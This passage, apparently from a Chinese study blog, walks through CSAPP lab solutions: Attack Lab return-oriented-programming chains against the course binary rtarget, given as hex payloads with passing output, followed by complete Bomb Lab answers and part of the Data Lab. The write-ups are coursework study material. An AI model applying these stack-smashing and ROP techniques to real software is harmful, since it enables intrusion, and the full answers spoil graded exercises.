0048 c7 c4 b7 dc 61 5548 c7 c7 bf dc 61 55c3fa 18 40 00 00 00 00 00 //touch335 39 62 39 39 37 66 61 00 //string 运行结果如下 123456789$ ./hex2raw -i key_3.txt | ./ctarget -qCookie: 0x59b997faType string:Touch3!: You called touch3(&quot;59b997fa&quot;)Valid solution for level 3 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3 Part2 Level2 (Phase 4) 在第二部分中程序进行了增强，具体如下： 栈的地址进行了随机化，意味着无法再直接确定攻击的地址 内存中为栈分配的空间没有了执行权限，意味着无法注入代码段在栈中 但是我们“小工具“可以通过其原有代码的部分代码段作为我们执行的二进制代码，从而产生我们需要的效果。这里的小工具实际上是一个函数的最后部分，执行这个片断的代码并返回栈中，继续ret到栈中下一行所指向的代码,由于在此其间并没有call过这个函数，栈中的数据并不会被破坏修改，从而能按照栈中的地址一步步执行。 在这个部分我们需要在这个限制条件下重新入侵到Phase 2函数中，并给予限制如下： 解决方案需要使用小工具的方式实现 只能使用到前八个寄存器 限制使用的指令为movq popq ret nop 实际上看上去是一些限制其实也是一些提示，帮助我们减少检索指令的范围。同时所有可能用到的指令都作为附件放在文档的最后，大家做的时候应该仔细查阅。 接下来开始实验的过程 首先将汇编代码保存本地 1$ objdump -d rtarget &gt; rtarget.S 按照要求找到start_farm 和 mid_farm之间的汇编代码。根据需求，我们需要修改%rdi寄存器的值，并将执行的PC跳转到touch2函数的位置。首先查看cookie的值（方法同Phase 2）为0x59b997fa 。现在需要将这个值放入栈中并在小工具中将popq到某个寄存器中，在执行寄存器movq指令即可。 观察工具代码部分有如下代码 12300000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 ret 这里最后的58 90 c3 分别对应三个指令popq %rax 、nop 、ret，所以我们可以在栈中存放同上面的值0x59b997fa 将其移动到%rax中。 接下来我们抱着目的性的找movq %rax %rdi , 也就是48 89 c7观察以下函数满足规则发现 12300000000004019c3 &lt;setval_426&gt;: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 ret 因此这个栈中的代码放置应该如下 12341: 0x00000000004019ab //addr &lt;addval_219&gt; + 42: 0x0000000059b997fa //需要的值用于popq3: 0x00000000004019c5 //addr &lt;setval_426&gt; + 24: 0x00000000004017ec //addr &lt;touch2&gt; 转换为二进制代码如下 12345678900 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ab 19 40 00 00 00 00 00fa 97 b9 59 00 00 00 00c5 19 40 00 00 00 00 00ec 17 40 00 00 00 00 00 最终执行结果如下 123456789$ ./hex2raw -i key_4.txt | ./rtarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2 Part2 Level3 (Phase 5) 这个部分就完全如法炮制的执行到Phase 3即可。通过上一题知道，其实执行到touch部分应该是和ctarget共用的代码段，所以可以直接认为需要的字符串参数为0x59b997fa即可。 但是当栈的位置不可知时只能利用%rsp指针的相对值，意味着我们需要计算出偏移量，对于这道题中如何加偏移量是重点。文档中其实没有给出任何执行运算的二进制代码，因此我们需要自己找。通过查找发现并没有add指令的操作码83，但是有lea 的函数如下 12300000000004019d6 &lt;add_xy&gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 ret 所以根据提供的函数，我们可以大致写出以下思路 1234567891011popq %rax(偏移量)movl %eax, %edxmovl %edx, %ecxmovl %ecx, %esimovq %rsp, %raxmovq %rax, %rdilea (%rdi, %rsi, 1), %raxmovq %rax, %rditouch3string 偏移量为取出%rsp的值到string的距离，为8 * 4 = 32B 也就是0x20 如上图的思路可以转换为二进制代码如下： 1234567891011121314151617181900 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ab 19 40 00 00 00 00 0020 00 00 00 00 00 00 00dd 19 40 00 00 00 00 00 /* movl %eax, %edx */69 1a 40 00 00 00 00 00 /* movl %edx, %ecx */27 1a 40 00 00 00 00 00 /* movl %ecx, %esi */06 1a 40 00 00 00 00 00 /* movq %rsp, %rax */c5 19 40 00 00 00 00 00 /* movq %rax, %rdi */d6 19 40 00 00 00 00 00 /* lea (%rdi, %rsi, 1), %rax */c5 19 40 00 00 00 00 00 /* movq %rax, %rdi */fa 18 40 00 00 00 00 00 /* touch3 */35 39 62 39 39 37 66 61 00 /* string */ 最后运行结果如下： 123456789$ ./hex2raw -i key_5.txt | ./rtarget -qCookie: 0x59b997faType string:Touch3!: You called touch3(&quot;59b997fa&quot;)Valid solution for level 3 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:3 总结 这个实验总体来说难度不大，但是很有趣味性，通过对栈溢出的攻击，让我们明白程序检测栈是否溢出的重要性。（不过到最后一题才看到hex2raw支持注释，对实验的便捷性还是提供一定帮助。）","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://lcjd99.github.io/categories/CSAPP/"}],"tags":[{"name":"C","slug":"C","permalink":"https://lcjd99.github.io/tags/C/"}]},{"title":"CSAPP深入理解计算机系统 Lab2(bomb Lab) 详解","slug":"Course/csapp/Lab2","date":"2023-10-15T14:51:47.000Z","updated":"2024-04-12T15:34:10.862Z","comments":true,"path":"Course/csapp/Lab2/","permalink":"https://lcjd99.github.io/Course/csapp/Lab2/","excerpt":"","text":"本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。同时我关注的不仅是实验本身还有实验中使用工具的学习。 实验说明 本实验通过逆向的方式模拟拆炸弹的过程，炸弹共有6道锁，我们需要逐一破解每一道锁，最终拆除炸弹。我们可以通过执行./bomb开始输入密码，也可以把密码输入到任意文件中作为参数传递给./bomb，例如./bomb passwords.txt 在动手实验之前需要仔细阅读实验说明, 其中重点阅读Hints的章节，这里提供一些提示 gdb, gdb是一个命令行调试器，我们可以用gdb查看程序的汇编并且轻易的查看内存。这里有一个CMU的简明gdb使用教程， objdump -t ，这个命令可以打印出炸弹的符号表，符号表会打印出所有函数名和函数地址。我们可以对程序的整体有一个直观的认识，同时快速定位到函数的位置。 objdump -d ，这个命令会直接打印出整个程序的汇编指令 prints 这个命令会打印出可打印的字符串。 还有一些工具能够提供官方文档： apropos，能够检索并列出本地相关关键词的文档 man，能够提供相应的官方文档，使用man ascii能方便获取到各个字符的ascii码 声明：本文后续转换的代码并被严格的C代码，而是描述思路的伪代码，并没有严格区分指针和值等的表述关系 实验具体流程 准备工作 实验提供一个c版本的框架可以让我们快速了解程序的框架，我们看到整个程序中的六个函数是phase_&#123;1..6&#125;，如果输入字符正确则会拆除炸弹。 1. 逆向产生汇编代码并保存 1objdump -d &gt; source.S 对于这个项目，我们需要关注其.text字段，为了方便我们可以删除其他字段。 1objdump -t bomb &gt; table.txt 这里对其做一些解释。 120000000000400ac0 l d .init 0000000000000000 .init0000000000000000 l df *ABS* 0000000000000000 bomb.c 根据其manual中的解释 Here the first number is the symbol’s value (sometimes referred to as its address). The next field is actually a set of characters and spaces indicating the flag bits that are set on the symbol. These characters are described below. Next is the section with which the symbol is associated or ABS if the section is absolute (ie not connected with any section), or UND if the section is referenced in the file being dumped, but not defined there. After the section name comes another field, a number, which for common symbols is the alignment and for other symbol is the size.Finally the symbol’s name is displayed. 第一列是标识符的地址或者值。 第二列是一个标记位，具体标记规则见其manual文档，这里给出几个常见的标记 :l代表本地，g代表全局，f代表文件，F代表函数，O代表对象。 第三列是标识符对应的段，其中*ABS*代表绝对的位置，UND代表没有定义在当前程序中。 地四列是对齐方式或变量大小 最后是标记符名 2.使用strings获取 1strings bomb &gt; strings.txt 将数据存储在strings.txt中以便后续使用。 3.整体逻辑分析 定位到其main的函数的字段，分析其执行逻辑，观察到如下代码段 123456400e19: e8 84 05 00 00 call 4013a2 &lt;initialize_bomb&gt;400e1e: bf 38 23 40 00 mov $0x402338,%edi400e23: e8 e8 fc ff ff call 400b10 &lt;puts@plt&gt;400e28: bf 78 23 40 00 mov $0x402378,%edi400e2d: e8 de fc ff ff call 400b10 &lt;puts@plt&gt;400e32: e8 67 06 00 00 call 40149e &lt;read_line&gt; 在这里是炸弹的初始化阶段，edi寄存器用于传递参数作为存储数据的位置，也就是说这里是输出程序的第一个炸弹提示语的地方，我们可以通过gdb进行验证。 1gdb bomb 进入gdb界面后我们通过b main将断点设置在main开始处，并通过r，执行到断点处。执行如下 12(gdb) x/s 0x4023380x402338: &quot;Welcome to my fiendish little bomb. You have 6 phases with&quot; 验证和推理一致，我同样可以在Strings.txt中找到这个字符串，这样我们就知道几个工具的用途，接下来就需要灵活应用来拆除炸弹了。 phase_1 第一个密码的破解我们首先定位到main函数中的 123400e32: e8 67 06 00 00 call 40149e &lt;read_line&gt;400e37: 48 89 c7 mov %rax,%rdi400e3a: e8 a1 00 00 00 call 400ee0 &lt;phase_1&gt; 以下部分是对程序的深入探索，单纯解题可以跳到分割线后。 我们知道这里将这里将函数read_line的返回值地址作为函数phase_1的参数传递 先看到函数read_line，根据函数名我们大致推测这是简单读入一行字符，但是不知道是否还有其他操作。根据其中调用的函数skip理解其含义（理解的过程中可以对照table.txt中的变量确定大小和位置,借用gdb确定其值），将skip写出伪代码大概如下： 1234567891011121314151617skip()&#123; do&#123; //这里有一段很令人迷惑的汇编会在最后彩蛋部分解释 ... rdi = 0x603780; rdx = (stdin); esi = 80; // 如果读到函数会返回地址，如果未读到返回空 rax= fgets(addr= rdi, size= esi, stream = rdx); rbx = rax; if(rax == 0) break; //没有读到行 rdi = rax; eax = blank_line(rdi); //判断是否为空行 &#125;while(eax != 0) rax = rbx; return rax;&#125; skip会自动跳过空行读取到第一个有数据的行，或者错误的行。 read_line()有大量代码用于检测各种输入问题，同时隐藏细节，在彩蛋部分会解释，这里只需要知道这是一个读入一行字符串的函数即可 接下来正式进入phase_1的代码 我们发现在调用strings_not_equal时，他仅仅是将0x402400传递给第二个参数esi，而第一个参数是传入函数的参数可以写出如下伪代码 1234567phase_1(rdi)&#123; esi = 0x402400; eax = strings_not_equals(rdi, esi); if(eax != 0)&#123; explode_bomb(); //爆炸 &#125;&#125; 看到strings_not_equals的代码可以转化为 1234567891011121314151617181920strings_not_equals(rdi, rsi)&#123; //第一个字符串 rbx = rdi; //第二个字符串 rbp = rsi; eax = string_length(rdi); //r12d 存长度 r12d = eax; rdi = rbp; eax = string_length(rdi); if(eax != r12d) retrun eax = edx = 1; eax = *(rbx); for(al != 0)&#123; if(al != *(rbp)) retrun eax = edx = 1; rbx++; rbp++; eax = *(rbx); &#125; return eax = edx = 0;&#125; 其实就是正常的判断是否相等的代码。 所有只需要通过gdb找到0x402400位置的字符串即可 12(gdb) x/s 0x4024000x402400: &quot;Border relations with Canada have never been better.&quot; 这个字符串即结果 phase_2 调用函数前的过程详见phase_1的解析，我们直接关注到调用的函数内部。 函数中调用read_six_number函数的解析如下 这个函数其实让我们看到机器在参数多于寄存器能表达的数量是所做的工作，利用栈来保存结果指针的位置。该函数所做的工作就是将rsi传递过来的参数（也就是需要存储的指针）分别存在6个变量中以便sscanf调用时能够存储到正确的位置。 首先我们看到sscanf的声明如下 1int sscanf(const char *restrict str, const char *restrict format, ...); 而这里传递的第二个参数对应于format,我们通过gdb查看对应的寄存器$esi位置0x4025c3可知 12(gdb) x/s 0x4025c30x4025c3: &quot;%d %d %d %d %d %d&quot; 所需要解析的是6个32位整数，对应每个变量大小为4B，也和代码中以4B为基准将指针记入寄存器相同。 我们可以看到6个整数指针的对应关系如下: 12345678str $rdiformat $rsiarg0 $rdxarg1 $rcxarg2 $r8arg3 $r9arg4 ($rsp)arg5 ($rsp + 8) 这样就能把6个整数从字符串中解析到指针$rsi所指向的地址中，下面看回phase_2可以表示为如下伪代码 12345678910111213phase_2(rdi)&#123; rsi = rsp; read_six_numbers(rdi, rsi); //将6个数据从rdi字符串中读入rsp位置中 if(rsp[0] != 1) &#123; explode_bomb(); &#125; for(i=1; i&lt;6; ++i)&#123; if(rsp[i] != rsp[i-1] + rsp[i-1])&#123; explode_bomb(); &#125; &#125;&#125; 所有可以知道第二个密码应该是 11 2 4 8 16 32 phase_3 开始读取两个整数的操作和phase_2完全相同，后面的部分核心的语句为 1400f75: ff 24 c5 70 24 40 00 jmp *0x402470(,%rax,8) 我们在gdb里打印对应内存信息如下 12(gdb) x/x *0x4024700x400f7c &lt;phase_3+57&gt;: 0xb8 说明这里对应的就是&lt;phase_3+57&gt; + 8 * $rax，而观察发现下面的代码正好每两行占用内存空间为8B，所有这就是一个switch语句。伪代码如下 123456789101112131415161718phase_3(rdi)&#123; rdx = rsp + 8; rcx = rsp + 12; rax = sscanf(rdi, rsi, rdx, rcx); if(rax &gt; 1 &amp;&amp; (rsp+8) &gt; 7)&#123; switch((rax))&#123; case 0: eax = 0xcf; break; .. //后续省略 &#125; if( (rsp + 12) != eax)&#123; explode_bomb(); &#125; &#125;else&#123; explode_bomb(); &#125;&#125; 所有本题的答案有八组，任意选择其中的一组即可，我选择 0 207 phase_4 本题前面读入两个整数的过程和phase_3相同，为便于分析逻辑可以直接替换变量名，容易转换为如下形式 12345678910phase_4(str)&#123; sscanf(str, &quot;%d %d&quot;, a, b); if(a &gt; 15)&#123; explode_bomb(); &#125; ans = func4(a, 0, 15); if(ans != 0 || b != 0)&#123; explode_bomb(); &#125;&#125; 下面重点放在func4函数中，我们看到这个函数需要三个参数，分析函数后可以将其转化为以下递归函数， 12345678910111213141516171819func4(rdi, rsi, rdx)&#123; eax = (rdx) - (rsi); ecx = (unsigned)(eax) &gt;&gt; 31; eax += ecx; eax &gt;&gt; 1; ecx = rax + rsi + 1; if(ecx &lt;= edi)&#123; rdx = rcx - 1; rax = func4(rdi, rsi, rdx); rax = rax * 2; &#125;else if(ecx == edi)&#123; rax = 0; &#125;else&#123; esi = rcx + 1; rax = func4(rdi, rsi, rdx); rax = rax * 2 + 1; &#125; return rax;&#125; 在根据调用是的限制条件知道可以转化为 12345678910111213141516func4(x, y, z)&#123; tmp = z - y + (z &lt; y ? 1 : 0); tmp &gt;&gt;= 1; tmp += y; //tmp 实际上就是 (y + z) / 2; if(tmp &gt; x)&#123; ans = func4(x, y, tmp - 1); ans = ans * 2; &#125;else if(tmp == x)&#123; ans = 0; &#125;else&#123; ans = func4(x, tmp + 1, z); ans = ans * 2 + 1; &#125; return rax;&#125; 可以看出其实就是一个二分查找的算法，而让ans为0的方法是，始终保证x，在中值的左边，直到找到中间值为x时。 始终选择左边的中间值如下： 1234( 0 + 15 ）/ 2 = 7( 0 + 7 ) / 2 = 3( 0 + 3 ) / 2 = 1( 0 + 1 ) / 2 = 0 所有最终第一个数可以是7,3,1,0，第二个数为0 phase_5 本题有一点真正破解的的感觉了，通过汇编代码会发现，整个过程分为三个阶段，我将逐一解释，为方便起见，我会给字符串以a,b,c命名。 1. 确保读入的字符串a长度为6，并进入一个循环 这里的代码没有什么特别的，但是有一个与解题无关的小细节小细节， 1234567840106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp)...4010de: 64 48 33 04 25 28 00 xor %fs:0x28,%rax4010e5: 00 00 4010e7: 74 05 je 4010ee &lt;phase_5+0x8c&gt;4010e9: e8 42 fa ff ff call 400b30 &lt;__stack_chk_fail@plt&gt; 这里实际上是在栈中偏移为0x18的地方放置一个用于验证的验证码，确保在函数返回是能找到正确的返回地址，防止出现通过读入字符串而破坏栈，从而植入非法地址的问题。 2. 通过a获取新字符串 核心代码如下 12345640108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx40108f: 88 0c 24 mov %cl,(%rsp)401092: 48 8b 14 24 mov (%rsp),%rdx401096: 83 e2 0f and $0xf,%edx401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 我们可以看到，其中rax相当于字符串的偏移量，取出的字符串也只需要其低位的字，又以该字为偏移量到0x4024b0中取出一个字，并放在栈中的指定位置。 我们通过gdb打印出0x4024b0处的字符串（可以看作是一个对应的哈希表） 12(gdb) x/s 0x4024b00x4024b0 &lt;array.3449&gt;: &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot; 我们指需要前16个字符，因为取出低位最多访问16个字符 抽象出的代码如下 1234567char * str = &quot;xxxxxx&quot; //输入的字符串const char * hash = &quot;maduiersnfotvbyl&quot;; //0x4024b0char ans[7]; //0x10(%rsp)for(i = 0; i &lt; 6; ++i)&#123; ans[i] = hash[str[i] &amp; 0xf];&#125;ans[6] = &#x27;\\0&#x27;; //4010ae: movb $0x0,0x16(%rsp) 3. 比较生成的字符串和秘密表 最终的密码放在0x40245e的位置处，通过gdb可知为flyers，因此只要能让我们输入的字符串作为键产生相应的值即可。具体如下 123456&#x27;f&#x27; &lt;=&gt; hash[0x9]&#x27;l&#x27; &lt;=&gt; hash[0xd]&#x27;y&#x27; &lt;=&gt; hash[0xc]&#x27;e&#x27; &lt;=&gt; hash[0x5]&#x27;r&#x27; &lt;=&gt; hash[0x6]&#x27;s&#x27; &lt;=&gt; hash[0x7] 通过键入man ascii找到任意对应的值字符即可，我选择的是IONEFG phase_6 在最开始的部分和phase_2一样通过字符串将6个整数读入栈中，接下来的代码将分为以下几个部分 1. 双重循环 首先看代码从 0x40110e到0x401151的部分。 这里的r13代表外层循环的位置，r12d代表外层指针索引，可以抽象为以代码 1234567891011int arr[6]; //6个数for(i = 0; i &lt; 6; ++i)&#123; if(arr[i] &lt; 1 || arr[i] &gt; 6)&#123; explode_bomb(); &#125; for(j = i; j &lt; 6; ++j)&#123; if(arr[i] == arr[j])&#123; explode_bomb(); &#125; &#125;&#125; 说明这6个数互不相同其都在[1,6]之间，也就是1到6的排列。(难怪官方要限制测试数量，这里写个脚本暴力测试只需要最多5! = 120次就可以测出答案) 2. 数据修改 代码从 0x401153到0x40116d的部分，将数据都用7减去 123for(i = 0 ; i &lt; 6; ++i)&#123; arr[i] = 7 - arr[i];&#125; 3.链表查询 代码从 0x40116f到0x4011a9的部分。 我们看到rdx存储的实际上是0x6032d0，而其变换方式是mov 0x8(%rdx),%rdx，也就是说将代码当前位置偏移8B位置下的数据作存入rdx中，实际上就是 1234struct node&#123; long data; //数据为8B struct node* next;&#125; 这样一个结构的链表的遍历方式。 而在代码中又通过arr[i]作为其控制遍历的位置，并将地址存入栈中，可以将这部分代码表示为 12345678910struct node* keys[6]; //0x20(%rsp）struct node* first = 0x6032d0; //头结点位置for(int i = 0 ; i &lt; 6; ++i)&#123; int times = arr[i] - 1; struct node * tmp = first; while(times--)&#123; tmp = tmp -&gt; next; &#125; keys[i] = tmp;&#125; 4.将结点值重新赋值 代码从 0x4011ab到0x4011d0的部分。 在这里rcx可以理解为新链表的当前指针。 12345678struct node* current = keys[0];while(1)&#123; long rdx = keys[i]-&gt;data; current-&gt;next-&gt;data = rdx; i++; if(i &gt;= 6) break; current = key[i];&#125; 这一步相当于将链表的值按照keys中的顺序重新赋值 5.判断结点是否满足关系 代码从 0x4011da到0x4011f5的部分。 可以将rbx看作当前指针current，这里有个坑在于虽然数据存储的8B，但是在比较时却只使用其中4位。 123456789int i = 5;current = keys[0];while(i--)&#123; struct node* next = current-&gt;next; // rax if((int)curret-&gt;data &lt; (int)next-&gt;data)&#123; // explode_bomb(); &#125; current = next;&#125; 可以看出需要数据在链表中顺序排列 6.通过分析结果反推密码 我们通过gdb以此查找处链表中的数据如下 123456node1: 0x014cnode2: 0x00a8node3: 0x039cnode4: 0x02b3node5: 0x01ddnode6: 0x01bb 所以需要保证其数据为排列为3 4 5 6 1 2，又因为在第2步用7将数据去补数，所以转换后为4 3 2 1 6 5 结束了？（彩蛋） 将所有结果按行写入文件key.txt后，执行./bomb key.txt，会得到以下结果 但是在看汇编代码时可以看到其实本实验还有一个隐藏部分，在phase_defused中会尝试从有个这样sscanf(0x603870, &quot;%d %d %s&quot;, rdx, rcx, r8)的函数调用，输入串中读入一个&quot;%d %d %s&quot;的数据，并比较其中的%s是否为&quot;DrEvil&quot;，如果符合条件将进入隐藏函数secret_phase 我们看到这个函数 secret_phase中只需判断函数fun7($6030f0, input) == 2即可，函数fun7()表示如下 1234567891011121314//x($edi) y($esi)int fun7(void* x, void* y)&#123; if(x == 0)&#123; return 0xfffffffff; &#125; if(*(int *)x &gt; *(int *)y)&#123;//part1 return fun7(x+0x8, y) * 2; &#125;else if(*(int *)x == *(int *)y)&#123;//part2 return 0; &#125;else if(*(int *)x &lt; *(int *)y)&#123;//part3 return fun7(x+0x10, y)*2 + 1; &#125;&#125; 为保证达到目的，画出递归栈可知道，需要保证递归栈中的顺序为part2 part3 part1 （从栈顶向下看）即可。使用gdb查看内存情况如下 1234567891011(gdb) x/16x 0x6030f0 //需要知道 n1 + 8 存储的地址0x6030f0 &lt;n1&gt;: 0x24 0x00 0x00 0x00 0x00 0x00 0x00 0x000x6030f8 &lt;n1+8&gt;: 0x10 0x31 0x60 0x00 0x00 0x00 0x00 0x00(gdb) x/24x 0x603110 //需要知道 n21 + 16 存储的地址0x603110 &lt;n21&gt;: 0x08 0x00 0x00 0x00 0x00 0x00 0x00 0x000x603118 &lt;n21+8&gt;: 0x90 0x31 0x60 0x00 0x00 0x00 0x00 0x000x603120 &lt;n21+16&gt;: 0x50 0x31 0x60 0x00 0x00 0x00 0x00 0x00(gdb) x/8x 0x603150 //需要知道 n32存储的值0x603150 &lt;n32&gt;: 0x16 0x00 0x00 0x00 0x00 0x00 0x00 0x00 由此知结果应该表示为22(即0x16) 想要触发并解题，应在任意一道做对后一行输入x x DrEvil (前面两个数字目前看来为任意值)。现在问题转化成如何将这个字符串放在0x6030f0的内存中。 这让我想到第一次读到skip开始那一段没有看懂的代码（可以回看到phase_1部分）。现在抱着目的性的看就豁然开朗。这里实际上是通过记录输入字符串的数量作为偏移量的，将每个读入的字符串都存在内存中的，相当于一个字符串堆，计算过程如下 1230x603870 - 0x603780 = 240 //偏移总量240 &gt;&gt; 4 = 240 / 2^4 = 15 //对应shl操作15 / 5 = 3 //对应lea 说明在第4个字符串时应该写入这个串，那么读入这个串后如何读入正常的第4个串，其实对于sscanf它根据给定格式匹配，所以第四个字符1 0 后加入能DrEvil即可。不得不说这样的设计还是很精妙的。 总结 最后贴图测试结果 对于这个实验，我是以直接阅读逆向的汇编代码为主。实际上以做题为目的，将GDB作为主要调试工具更快，更高效。我认为lab2的特点在于循序渐进，它的前后铺垫做的很好，整体做下来对汇编的理解会提升不少。欢迎大家留言讨论，共同学习。","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://lcjd99.github.io/categories/CSAPP/"}],"tags":[{"name":"C","slug":"C","permalink":"https://lcjd99.github.io/tags/C/"}]},{"title":"CSAPP深入理解计算机系统 Lab1(Data Lab) 详解","slug":"Course/csapp/Lab1","date":"2023-10-01T14:51:47.000Z","updated":"2024-04-12T15:33:45.006Z","comments":true,"path":"Course/csapp/Lab1/","permalink":"https://lcjd99.github.io/Course/csapp/Lab1/","excerpt":"","text":"本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。 实验说明 在动手实验之前建议仔细阅读实验提供的文档以及bits.c前的注释。本实验对应CSAPP的第二章，是对位运算的处理和应用。在解决这些问题过程中，会对位运算有更深刻的理解。实验中提供13个函数接口，我们需要根据函数前注释的要求实现相应的功能，同时满足所要求的限制条件。 环境配置 我的实验环境是Debian(x86_64)，编译32位的程序需要使用 sudo apt-get install gcc-multilib下载gcc-multilib，这是一个能够实现不同位数的编译器。下载后可以正常make编译。 实验中的工具dlc和driver.pl中可用-h参数查看使用手册 一些小坑 使用dlc时出现bits.c:xx:parse error bits.c:xx:undeclared variable xx 是因为该编译器仅仅支持C89的语法,需要将变量全部在代码块的开头声明。 使用dlc时出现bits.c:284: Warning: suggest parentheses around arithmetic in operand of x 是因为运算符优先级肯存在歧义，建议为优先运算块加括号 整数规则细节 表达式规则 整数的范围在0~255之间，不能使用大整数 只能使用局部变量和参数 允许使用单目运算符 ! ~ 允许使用双目运算符 &amp; ^ | + &lt;&lt; &gt;&gt; 禁止使用 非顺序执行的语句 宏 调用函数 使用不在规定范围内的操作符 使用强制类型转换 使用非int类型，使用数组，结构体等 对运行机器的规定 使用补码，32位整数表示 按算术方式执行右移 如果移位数 大于31 或 小于0 , 移位有不可预测的行为 整数具体题解 1. bitXor 根据异或运算的表达式 A⊕B=(A∧¬B)∨(¬A∧B)A \\oplus B = (A \\land \\lnot B) \\lor (\\lnot A \\land B) A⊕B=(A∧¬B)∨(¬A∧B) 可知代码如下 123456789101112/* * tmin - return minimum two&#x27;s complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int bitXor(int x, int y) &#123; int a = x &amp; ~y; int b = ~x &amp; y; int ans = ~(~a &amp; ~b); return ans;&#125; 2. tmin 根据补码规则，最高位符号位为1时为负数，CSAPP上有一张图很好解释补码的规则 所以根据这个规则我们知道最小的补数就是最高位为1，其余为0的数，实现代码如下 12345678910/* * tmin - return minimum two&#x27;s complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) &#123; int p = 1; return p &lt;&lt; 31;&#125; 3. isTmax 同样根据上面的图可知，最大的数和最小的数在补数规则中是完全去反的规则，由此可以找出最大的数。要想不通过==比较两个数，我们可以采用异或后结果是否等于0的方式判断，因为只有相等才会异或为0。 但是本题禁止使用&lt;&lt;，代表我们需要采用另一种方式实现。我们令最大的数0x7fffffff为a。发现a+a = 0xffffffe(相当于右移一位)，对其去反的结果为1。顺着这个思路我们只需要找到其他满足~(x+x+1) == 0的数排除即可。不难思考，将0xffffffe右移的两种情况中的另一种为0xffffffff（也就是-1）,即-1 + 1 == 0，因此判断逻辑不难表达如下 1234567891011121314151617 /* isTmax - returns 1 if x is the maximum, two&#x27;s complement number, * and 0 otherwise * Legal ops: ! ~ &amp; ^ | + * Max ops: 10 * Rating: 1 */int isTmax(int x) &#123; //判断想x+x+1取反后是否为0,tag可减少一个符号的使用 int tag = x + 1; int tmp1 = ~(x + tag); int flag1 = !tmp1; //判断是否为-1 int flag2 = !tag; //产生结果后 return flag1 &amp; !flag2;&#125; 4. allOddBits 题目需要找到所有奇数位都是1的数，可以通过移动一位后，判断或运算是否所有位都是1来判断结果,其中全位都是1就是-1，可以再简化判断 12345678910111213141516/* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 2 */int allOddBits(int x) &#123; int t = 0xaa | (0xaa &lt;&lt; 8) | (0xaa &lt;&lt; 16) | (0xaa &lt;&lt; 24); int a = x &amp; t; int b = a &gt;&gt; 1; int c = a | b; int ans = !(c + 1); return ans;&#125; 5. negate 直接使用补码定义即可 12345678910/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) &#123; return ~x + 1;&#125; 6. isAsciiDigit 主要思路是首先通过判断高位(4到7位)的为0011b,可以同时判断其他位是否为0,然后判断最后一位，观察发现（可以通过卡诺图辅助），满足条件的如下：满足0xxx (x表示任意)或者是8或9,实现代码如下 12345678910111213141516/* * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;) * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 3 */int isAsciiDigit(int x) &#123; int y = x &amp; 0xf; int z = (x &gt;&gt; 4); int flag1 = (!(y&gt;&gt;3)) | ( !(y ^ 8) | !(y ^ 9)); int flag2 = !(z ^ 3); return flag1 &amp; flag2 ;&#125; 上述的符号数为13，符合规定。但是观察发现，每次都需要使用!,我们可以通过摩根公式化简flag1,筛选掉不要的值，观察发现，在11xxb和1x1xb是需要剔除的元素,代码简化后如下,只需要11个符号 123456int isAsciiDigit(int x) &#123; int flag1 = !((x &amp; 0xa) ^ 0xa); int flag2 = !((x &amp; 0xc) ^ 0xc); int flag3 = ((x &gt;&gt; 4) ^ 3); return !(flag1 | flag2 | flag3);&#125; 7. conditional 我们需要通过任何非1的数生成出0xffffffff(也就是-1)，同时0还是0。这个算法可以把思路转化为通过1生成0，通过0生成-1，那么也就-1对数减1即可。 具体可见代码注释 123456789101112131415/* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 16 * Rating: 3 */int conditional(int x, int y, int z) &#123; //产生-1 int neg = ~0; //!!x保证任何非0数为1，0还是0 int mask = !!x + neg; //使用掩码的方式实现条件 return (y &amp; ~mask) | (z &amp; mask);&#125; 8. isLessOrEqual 本题需要分为两种情况，两个数异号和同号， 异号的情况是如果相减会溢出，我们通过符号位的特点判断结果，观察发现，异号时结果和x的符号位同步 同号的情况相减判断符号位即可，这里的技巧是由于0和正数的符号位相同，因此采用y - x &gt;= 0判断会简化过程 